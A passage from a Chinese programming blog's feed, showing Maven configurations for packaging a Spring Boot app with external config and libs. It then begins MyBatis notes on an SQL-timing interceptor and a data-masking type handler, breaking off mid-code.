class="name">phase</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">goal</span>&gt;</span>copy-resources<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--配置文件打包成config目录下 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>$&#123;project.build.directory&#125;/twin-web/config<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>使用maven-jar-plugin 打包可执行jar 并排除依赖<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!--输入打包可执行的jar到twin-web\libs\下--&gt;</span></span><br><span class="line">          $&#123;project.build.directory&#125;/twin-web/</span><br><span class="line">       <span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">addMavenDescriptor</span>&gt;</span>false<span class="tag">&lt;/<span class="name">addMavenDescriptor</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">addClasspath</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addClasspath</span>&gt;</span></span><br><span class="line">         <span class="comment">&lt;!-- 增加执行启动jar的依赖jar包目录前缀--&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">classpathPrefix</span>&gt;</span>./libs/<span class="tag">&lt;/<span class="name">classpathPrefix</span>&gt;</span></span><br><span class="line">         <span class="comment">&lt;!-- 指定启动类--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.keqing.twinweb.TwinWebApplication<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!-- 增加配置文件的classpath--&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Class-Path</span>&gt;</span>./config/<span class="tag">&lt;/<span class="name">Class-Path</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 排除配置文件--&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>*.yml<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>mapper/**<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>*.xml<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>使用maven-dependency-plugin 打包libs目录下<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-dependency-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>copy-dependencies<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">goal</span>&gt;</span>copy-dependencies<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>$&#123;project.build.directory&#125;/twin-web/libs<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">excludeTransitive</span>&gt;</span>false<span class="tag">&lt;/<span class="name">excludeTransitive</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">stripVersion</span>&gt;</span>false<span class="tag">&lt;/<span class="name">stripVersion</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">includeScope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">includeScope</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="方式三-使用maven-assembly-plugin打包"><a href="#方式三-使用maven-assembly-plugin打包" class="headerlink" title="方式三 使用maven-assembly-plugin打包"></a>方式三 使用maven-assembly-plugin打包</h5><ul>
<li>项目应用的配置文件排除<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">             <span class="comment">&lt;!--filerting设置为true,则打包过程中会对这些文件进行过滤处理--&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>true<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">             <span class="comment">&lt;!--使用通配符--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.yml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">include</span>&gt;</span>mapper/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 这里可以根据你实际想要包含的配置文件类型来添加更多的include配置 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>配置spring-boot-maven-plugin<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目的启动类,如果有多个main就必须指定，没有可以缺失</span></span><br><span class="line"><span class="comment">         &lt;mainClass&gt;XXXXX.TwinWebApplication&lt;/mainClass&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--解决windows命令行窗口中文乱码--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jvmArguments</span>&gt;</span>-Dfile.encoding=UTF-8<span class="tag">&lt;/<span class="name">jvmArguments</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">layout</span>&gt;</span>ZIP<span class="tag">&lt;/<span class="name">layout</span>&gt;</span></span><br><span class="line">           <span class="comment">&lt;!--配置需要打包进项目的jar--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--填写需要打包所需要的依赖 。没有匹配上任何jar包机排除依赖--&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">include</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>no-exists-jar<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>non-exists-jar<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                 <span class="comment">&lt;!-- 表示当运行mavn package打包时，使用Springboot插件打包 --&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">goal</span>&gt;</span>repackage<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>引入springboot里约定maven-assembly-plugin<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 打包文件名字不包含 assembly.xml 中 id --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">appendAssemblyId</span>&gt;</span>false<span class="tag">&lt;/<span class="name">appendAssemblyId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">descriptors</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--项目所在目录配置文件的 assembly.xml文件 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">descriptor</span>&gt;</span>assembly.xml<span class="tag">&lt;/<span class="name">descriptor</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">descriptors</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">id</span>&gt;</span>make-assembly<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">goal</span>&gt;</span>single<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>
配置assembly.xml文件<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">assembly</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- 打包文件名的标识符，用来做后缀--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>make-assembly<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 打包的类型，如果有N个，将会打N个类型的包 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">formats</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">format</span>&gt;</span>tar.gz<span class="tag">&lt;/<span class="name">format</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">format</span>&gt;</span>zip<span class="tag">&lt;/<span class="name">format</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">formats</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- 压缩包下是否生成和项目名相同的根目录 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">includeBaseDirectory</span>&gt;</span>true<span class="tag">&lt;/<span class="name">includeBaseDirectory</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- 用来设置一组文件在打包时的属性。--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">fileSets</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- 0755-&gt;即用户具有读/写/执行权限，组用户和其它用户具有读写权限；--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 0644-&gt;即用户具有读写权限，组用户和其它用户具有只读权限；--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 将src/bin目录下的jar启动脚本输出到打包后的目录中 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">fileSet</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--lineEnding选项可用于控制给定的行结束文件 --&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">lineEnding</span>&gt;</span>unix<span class="tag">&lt;/<span class="name">lineEnding</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">directory</span>&gt;</span>$&#123;basedir&#125;/bin<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>$&#123;file.separator&#125;<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">fileMode</span>&gt;</span>0755<span class="tag">&lt;/<span class="name">fileMode</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">include</span>&gt;</span>**.sh<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">include</span>&gt;</span>**.bat<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">fileSet</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 把项目的配置文件，打包进压缩文件的config目录 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">fileSet</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">directory</span>&gt;</span>$&#123;basedir&#125;/src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>config<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">fileMode</span>&gt;</span>0644<span class="tag">&lt;/<span class="name">fileMode</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">include</span>&gt;</span>*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">include</span>&gt;</span>*.yml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">include</span>&gt;</span>*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">include</span>&gt;</span>mapper/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">fileSet</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- 把项目自己编译出来的jar文件，打包进zip文件的根目录 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">fileSet</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">directory</span>&gt;</span>$&#123;project.build.directory&#125;<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>$&#123;file.separator&#125;<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">include</span>&gt;</span>*.jar<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">fileSet</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">fileSets</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 依赖包的拷贝--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencySets</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependencySet</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">unpack</span>&gt;</span>false<span class="tag">&lt;/<span class="name">unpack</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">useProjectArtifact</span>&gt;</span>true<span class="tag">&lt;/<span class="name">useProjectArtifact</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>lib<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencySet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencySet</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">unpack</span>&gt;</span>false<span class="tag">&lt;/<span class="name">unpack</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">useProjectArtifact</span>&gt;</span>true<span class="tag">&lt;/<span class="name">useProjectArtifact</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>lib<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>system<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencySet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencySet</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">unpack</span>&gt;</span>false<span class="tag">&lt;/<span class="name">unpack</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">useProjectArtifact</span>&gt;</span>true<span class="tag">&lt;/<span class="name">useProjectArtifact</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>lib<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencySet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencySets</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">assembly</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>Java后端框架</category>
      </categories>
      <tags>
        <tag>SpringBoot框架</tag>
      </tags>
  </entry>
  <entry>
    <title>Mybatis笔记</title>
    <url>/cnblogs.github.io/2025/01/10/backEnd/java/mybatis/Mybatis%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="自定义插件"><a href="#自定义插件" class="headerlink" title="自定义插件"></a>自定义插件</h3><p>假设我们想做一个插件，用于统计每个 SQL 查询的执行时间。这听起来是不是很酷？下面就是实现这个功能的具体步骤。</p>
<h4 id="第一步：实现-Interceptor-接口"><a href="#第一步：实现-Interceptor-接口" class="headerlink" title="第一步：实现 Interceptor 接口"></a>第一步：实现 Interceptor 接口</h4><p>MyBatis 插件的核心在于实现org.apache.ibatis.plugin.Interceptor 接口。这个接口只有一个方法需要重写：intercept(Invocation invocation)。我们可以通过这个方法插入自定义逻辑。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.ibatis.executor.statement.StatementHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.plugin.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.ResultHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Intercepts(&#123;</span></span><br><span class="line"><span class="meta">    @Signature(type = StatementHandler.class, method = &quot;query&quot;, args = &#123;java.sql.Statement.class, ResultHandler.class&#125;),</span></span><br><span class="line"><span class="meta">    @Signature(type = StatementHandler.class, method = &quot;update&quot;, args = &#123;java.sql.Statement.class&#125;)</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TimeStatInterceptor</span> <span class="keyword">implements</span> <span class="title class_">Interceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">intercept</span><span class="params">(Invocation invocation)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> invocation.proceed(); <span class="comment">// 调用原始方法</span></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">            System.out.println(<span class="string">&quot;SQL Execution Time: &quot;</span> + (end - start) + <span class="string">&quot; ms&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">plugin</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Plugin.wrap(target, <span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setProperties</span><span class="params">(Properties properties)</span> &#123;</span><br><span class="line">        <span class="comment">// 可以在这里设置插件属性</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="第二步：配置插件"><a href="#第二步：配置插件" class="headerlink" title="第二步：配置插件"></a>第二步：配置插件</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span> <span class="attr">interceptor</span>=<span class="string">&quot;com.example.TimeStatInterceptor&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Mybatis数据进行脱敏显示"><a href="#Mybatis数据进行脱敏显示" class="headerlink" title="Mybatis数据进行脱敏显示"></a>Mybatis数据进行脱敏显示</h3><h4 id="创建脱敏数据处理器"><a href="#创建脱敏数据处理器" class="headerlink" title="创建脱敏数据处理器"></a>创建脱敏数据处理器</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.ibatis.type.BaseTypeHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.type.JdbcType;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.type.MappedJdbcTypes;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.type.MappedTypes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.CallableStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="meta">@MappedJdbcTypes(JdbcType.VARCHAR)</span></span><br><span class="line"><span class="meta">@MappedTypes(String.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SensitiveInfoTypeHandler</span> <span class="keyword">extends</span> <span class="title class_">BaseTypeHandler</span> &#123;</span><br><span class="line">    <span class="comment">// 关键字列表，实际开发中，关键字列表可以做成配置或在表中存储，这样可以更灵活</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEYWORD_PATTERN</span> <span class="operator">=</span> <span class="string">&quot;token|Authorization|password|email|keyword1|keyword2|keyword3&quot;</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">PATTERN</span> <span class="operator">=</span> Pattern.compile(KEYWORD_PATTERN);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNonNullParameter</span><span class="params">(PreparedStatement ps, <span class="type">int</span> i, String parameter, JdbcType jdbcType)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="comment">// 一般个人信息或敏感数据都要加密存储，可以参考文末给出的数据加解密处理方案，这里不处理</span></span><br><span class="line">        ps.setString(i, parameter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getNullableResult</span><span class="params">(ResultSet rs, String columnName)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="comment">// 对结果进行脱敏</span></span><br><span class="line">        <span class="keyword">return</span> desensitize(rs.getString(columnName));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getNullableResult</span><span class="params">(ResultSet rs, <span 